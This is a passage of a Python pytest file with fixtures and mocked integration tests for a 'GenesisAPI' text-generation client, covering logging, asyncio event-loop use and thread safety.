            2147483647,
            253402300799
        ]
    }


@pytest.fixture
def mock_network_conditions():
    """Fixture for simulating various network conditions."""
    return {
        "slow_response": 5.0,
        "timeout_threshold": 30.0,
        "retry_delays": [1, 2, 4, 8, 16],
        "error_rates": [0.1, 0.2, 0.5, 0.8]
    }


# Integration tests with external dependencies
class TestGenesisAPIExternalIntegration:
    """Integration tests with external dependencies."""
    
    @pytest.mark.asyncio
    async def test_integration_with_logging_system(self):
        """Test integration with Python logging system."""
        import logging
        
        # Configure a test logger
        test_logger = logging.getLogger("genesis_api_test")
        test_logger.setLevel(logging.DEBUG)
        
        # Create a handler to capture log messages
        log_messages = []
        
        class TestHandler(logging.Handler):
            def emit(self, record):
                log_messages.append(record.getMessage())
        
        handler = TestHandler()
        test_logger.addHandler(handler)
        
        api = GenesisAPI(api_key="test_key", base_url="https://api.genesis.example.com")
        
        mock_response = {
            "id": "logging_test_id",
            "text": "Logging test response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Test that logging integration works
            with patch('logging.getLogger', return_value=test_logger):
                result = await api.generate_text("Test logging integration")
                assert result.text == "Logging test response"
        
        # Clean up
        test_logger.removeHandler(handler)

    @pytest.mark.asyncio
    async def test_integration_with_asyncio_event_loop(self):
        """Test proper integration with asyncio event loop."""
        api = GenesisAPI(api_key="test_key", base_url="https://api.genesis.example.com")
        
        mock_response = {
            "id": "event_loop_test_id",
            "text": "Event loop test response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Test that the API works with different event loop configurations
            result = await api.generate_text("Test event loop integration")
            assert result.text == "Event loop test response"
            
            # Test with asyncio.wait_for
            result = await asyncio.wait_for(
                api.generate_text("Test with timeout"),
                timeout=10.0
            )
            assert result.text == "Event loop test response"

    def test_thread_safety_considerations(self):
        """Test thread safety considerations for API instances."""
        import threading
        import queue
        
        api = GenesisAPI(api_key="thread_test_key", base_url="https://api.genesis.example.com")
        results_queue = queue.Queue()
        
        def worker():
            # Each thread should be able to create its own event loop
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            try:
                mock_response = {
                    "id": "thread_test_id",
                    "text": f"Thread {threading.current_thread().name} response",
                    "model": "genesis-v1",
                    "created": 1234567890,
                    "usage": {"prompt_tokens": 5, "completion_tokens": 10}
                }
                
                with patch('aiohttp.ClientSession.post') as mock_post:
                    mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
                    mock_post.return_value.__aenter__.return_value.status = 200
                    
                    result = loop.run_until_complete(
                        api.generate_text(f"Thread {threading.current_thread().name} test")
                    )
                    results_queue.put(result)
            finally:
                loop.close()
        
        # Start multiple threads
        threads = []
        for i in range(3):
            thread = threading.Thread(target=worker, name=f"TestThread-{i}")
            threads.append(thread)
            thread.start()
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        # Verify all threads completed successfully
        assert results_queue.qsize() == 3
        while not results_queue.empty():
            result = results_queue.get()
            assert "Thread TestThread-" in result.text
            assert "response" in result.text

